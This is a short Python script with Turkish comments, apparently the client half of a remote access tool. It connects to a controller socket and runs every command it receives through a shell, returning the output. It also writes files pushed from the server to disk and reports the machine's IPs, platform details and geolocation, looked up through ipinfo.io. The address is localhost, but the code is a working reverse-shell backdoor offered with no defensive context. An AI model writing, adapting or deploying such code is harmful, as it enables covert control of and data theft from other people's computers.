import socket
import os
import platform
import requests
import subprocess
from colorama import Fore, Style, init
from pyfiglet import figlet_format

# Colorama'nın otomatik olarak terminali desteklemesini sağlar
init()

# Ekranı temizle
os.system('cls' if os.name == 'nt' else 'clear')

# Logo oluşturuluyor
logo = figlet_format("Client", font="starwars")
print(Fore.CYAN + logo + Style.RESET_ALL)

# İstemci ayarları
host = '127.0.0.1'
port = 12334

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))

print(Fore.GREEN + "Bağlantı sağlandı." + Style.RESET_ALL)

def get_ip_and_location():
    try:
        # IP ve konum bilgilerini almak için bir dış API kullanıyoruz
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        ip_info = f"IP: {data.get('ip')}\nKonum: {data.get('city')}, {data.get('region')}, {data.get('country')}"
        return ip_info
    except requests.RequestException as e:
        return f"Hata: {str(e)}"

while True:
    try:
        data = client_socket.recv(1024).decode()
        
        if not data:
            break
        
        if data.startswith('UPLOAD '):
            filename = data.split(' ', 1)[1]
            with open(filename, 'wb') as f:
                while True:
                    file_data = client_socket.recv(1024)
                    if b'EOF' in file_data:  # Bitiş sinyalini kontrol et
                        f.write(file_data.replace(b'EOF', b''))  # EOF'yi temizle
                        break
                    f.write(file_data)
            print(Fore.GREEN + f"Dosya {filename} yüklendi." + Style.RESET_ALL)
            
        elif data == 'INFO':
            local_ip = socket.gethostbyname(socket.gethostname())
            public_ip = socket.gethostbyname(socket.getfqdn())
            system_info = platform.platform()
            location_info = get_ip_and_location()
            info = (f"Yerel IP: {local_ip}\n"
                    f"Kamu IP: {public_ip}\n"
                    f"Sistem Bilgisi: {system_info}\n"
                    f"{location_info}")
            client_socket.send(info.encode())
        
        elif data == 'EXIT':
            break
        
        else:
            # Komutları subprocess ile çalıştır ve çıktıyı gönder
            try:
                result = subprocess.run(data, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                client_socket.send(output.encode())
            except Exception as e:
                client_socket.send(f"Hata: {str(e)}".encode())
    
    except Exception as e:
        client_socket.send(f"Hata: {str(e)}".encode())
        break

client_socket.close()
